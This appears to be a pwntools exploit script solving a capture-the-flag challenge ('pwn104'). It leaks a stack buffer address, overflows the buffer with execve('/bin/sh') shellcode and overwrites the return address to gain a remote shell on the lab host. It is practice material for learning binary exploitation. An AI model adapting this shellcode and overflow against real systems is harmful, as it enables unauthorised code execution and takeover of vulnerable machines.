from pwn import * 
#context.binary = binary = ELF('./pwn104.pwn104')
context.log_level = "debug"
p = remote('10.10.194.218', 9004)

shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"

#p = process()
p.recv()
output = p.recv()

buffer_address = int(output.split(b"at")[1].strip().decode("utf-8"), 16)
payload = shellcode + b'A'*(0x50 - len(shellcode)) + b'B'*0x8 + p64(buffer_address)
p.sendline(payload)
p.interactive()
